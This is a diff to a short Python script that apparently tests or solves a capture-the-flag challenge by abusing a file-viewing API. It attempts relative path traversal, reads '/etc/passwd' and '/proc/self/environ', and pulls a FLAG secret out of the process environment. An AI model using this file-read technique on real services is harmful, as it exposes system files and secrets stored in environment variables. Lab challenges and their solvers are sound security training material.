@@ -27,18 +27,23 @@ def view(name):
     url = BASE + "/api/view?" + urllib.parse.urlencode({"name": name})
     try:
         with urllib.request.urlopen(url, timeout=10) as r:
-            return json.loads(r.read().decode())
+            body = r.read().decode()
     except urllib.error.HTTPError as e:
-        return json.loads(e.read().decode())
+        body = e.read().decode()
+    try:
+        return json.loads(body)
+    except json.JSONDecodeError:          # 500s return an HTML error page
+        return {"text": body}
 
 
 def main():
-    print("library   :", view("") or "?")
+    print("library   :", view("schedule.txt").get("text", "").strip())
     print("relative  :", view("../flag.txt"))          # blocked
     print("/etc/passwd[:40]:", view("/etc/passwd").get("text", "")[:40])
 
     env = view("/proc/self/environ").get("text", "")
-    m = re.search(r"FLAG=(\S+?)\\u0000", env) or re.search(r"FLAG=(\S+)", env)
+    # json.loads turns the \u0000 separator into a real NUL byte
+    m = re.search(r"FLAG=([^\x00\s]+)", env)
     print("env FLAG  :", m.group(1) if m else "(not found)")
     assert m and m.group(1) == FLAG
 
